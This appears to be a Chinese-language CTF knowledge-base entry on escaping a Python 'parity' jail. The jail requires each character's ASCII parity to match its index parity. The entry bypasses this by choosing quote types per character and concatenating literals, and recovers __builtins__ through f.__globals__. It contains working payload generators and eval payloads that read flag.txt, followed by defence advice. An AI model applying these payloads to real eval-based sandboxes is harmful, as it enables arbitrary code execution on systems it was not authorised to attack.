---
id: binary-pwn-sandbox-escape-pyjail-position-parity-quote-bypass
title: pyjail 位置/ASCII 奇偶校验绕过：按字符奇偶选引号拼接任意字符串
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-jail-index-ascii-parity-quote-bypass
aliases:
- parity 1
- parity 2
- JailCTF parity
- 奇偶校验 pyjail
- 引号奇偶性
- 下划线豁免
tags:
- python
- pyjail
- ctf
- parity
- quote
- eval
- sandbox-escape
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:02:25+08:00'
  notes: 已对照原文parity 1/2核对：i%2==ord(v)%2、单双引号奇偶、parseParity、parity2 f.__globals__['__builtins__'] 与_豁免一致；未验证点：未复跑。
---

## 一句话结论

当 pyjail 要求源码中每个字符满足“下标奇偶性 = ASCII 码奇偶性”后才 `eval` 时，这个约束并不能阻止任意代码执行：单引号（ASCII 39，奇）和双引号（ASCII 34，偶）的奇偶性不同，攻击者可以按目标字符的奇偶选择引号，把任意字符串拆成单字符字面量再用 `+` 拼接；再用空格/制表符调整位置，就能拼出任意表达式。若题目额外豁免 `_`，还可以直接用 `f.__globals__` 取回完整 `__builtins__`。

## 原理

- 校验通常是：
  ```python
  for i, v in enumerate(inp):
      if not (ord(v) < 128 and i % 2 == ord(v) % 2):
          reject()
  eval(inp)
  ```
  即第 i 个字符的 ASCII 奇偶必须等于 i 的奇偶。
- 引号本身也受校验：`'` 是 39（奇），`"` 是 34（偶）。因此：
  - 目标字符 ASCII 为偶数时，用单引号包成 ` 'x' `，配合前导空格让引号落在奇数/偶数正确的位置；
  - 目标字符 ASCII 为奇数时，用双引号包成 `"x"`；
  - `+` 是 43（奇）、空格是 32（偶），可用来补齐位置。
- 由于每个字符都被单独包成字符串字面量，最终表达式只是由 `+` 连接的字符串拼接，`eval` 会把它还原成任意字符串，再交给 `open`/`print`/`__import__` 等使用。
- **parity 2 变体**：题目改成 `eval(inp, {"__builtins__": None, 'f': f})`，并豁免 `_` 的奇偶检查。`dir(f)` 中满足校验的名字包括 `__globals__`、`__init__`、`__dir__` 等；利用 `_` 豁免写出 `f.__globals__`，再取 `['__builtins__']`，即可恢复完整 builtins，随后 `eval` 执行任意代码。
- 本质：校验把“字符位置”与“字符值”绑定，但字符串字面量的引号、空格、加号本身也是可控字符，攻击者可以用它们做“填充”，把任意目标字符搬到奇偶正确的位置。

## 触发条件

- 沙箱在执行前对整段源码做逐字符的奇偶校验，校验只涉及 ASCII 与下标。
- 执行端是 `eval` 且 `__builtins__` 可用（parity 1），或虽然 `__builtins__` 被置空但仍有函数对象/其它可达对象（parity 2）。
- 输入长度不受严格限制，或至少足以容纳逐字符拼接的表达式。

## 利用步骤

1. 先跑本地模糊测试，枚举 `dir(__builtins__)` 或 `dir(f)` 中哪些名字整体满足奇偶约束；这些名字是后续可用的“起点”。
2. 用生成器把目标代码字符串逐字符转成带引号的拼接表达式：
   ```python
   def parseParity(s):
       res = ""
       for i in range(len(s)):
           if ord(s[i]) % 2 == 0:
               res += f" '{s[i]}' +"
           else:
               res += f'"{s[i]}"+'
       return res.strip()[:-1]
   ```
3. 把 `parseParity("print(open('flag.txt').read())")` 的结果嵌入 ` eval\t(...)`，利用前导空格与制表符对齐整体奇偶；提交后 `eval` 会还原并执行目标代码。
4. parity 2：先用 `f.__globals__`（`_` 豁免）取 `['__builtins__']`，再取 `eval`，把完整 payload 作为参数执行；外层同样用 `parseParity` 包装字符串参数。

## PoC

```python
# parity 1
def parseParity(s):
    res = ""
    for i in range(len(s)):
        if ord(s[i]) % 2 == 0:
            res += f" '{s[i]}' +"
        else:
            res += f'"{s[i]}"+'
    return res.strip()[:-1]

ppayload = "print(open('flag.txt').read())"
payload = f""" eval\t({parseParity(ppayload)})"""
print(payload)
```

```python
# parity 2：f = lambda: None，__builtins__ 被置 None，'_' 豁免校验
ppayload = "print(open('flag.txt').read())"
payload = """f.__builtins__["print"](f.__builtins__["open"]("flag.txt").read())"""
inp = f"""f\t.__globals__ [{parseParity('__builtins__')}].eval\t({parseParity(payload)})"""
print(inp)
```

```text
# 典型结果：
# parity 1:  eval\t( 'p' +"r"+ 'i' +... )  → 打印 flag
# parity 2: f\t.__globals__ [ ... ].eval\t( ... ) → 恢复 builtins 后打印 flag
```

## 变体与关联

- 若校验条件反转为 `i % 2 != ord(v) % 2`，只需交换单/双引号的选择，或调整前导空格数量。
- 若只允许 ASCII 且禁用引号中的某一种，可用三引号、转义字符、`chr()` 拼接等替代；若禁用 `+`，可用相邻字符串字面量隐式拼接（`'a' 'b'`）。
- 关联：[[binary-pwn-sandbox-escape-python-eval-filter-bypass]]（字符/正则黑名单绕过）、[[binary-pwn-sandbox-escape-python-regex-ast-alias-concat]]（AST 与正则双层黑名单）。
- 边界：如果校验在 NFKC 规范化后按“语义字符”而不是原始位置进行，或直接使用 AST 白名单只允许数字/运算符，本手法失效；长度上限过小时逐个字符拼接可能放不下。

## 检测与防御

- 检测：审计是否存在“逐字符位置奇偶”这类看似严格但可被字面量字符填充的校验；对超长字符串拼接表达式、`+` 密集的输入告警。
- 修复：不要 `eval` 用户源码；必须求值时使用 AST 白名单，只允许数字和算术运算符，禁止字符串字面量、名称、属性访问和函数调用；或在解析后按 AST 语义检查，而不是按源码字符检查。
- 加固：执行环境彻底移除 `__builtins__` 并只传入必要常量；限制输入长度；在无 flag 的低权限进程中执行。
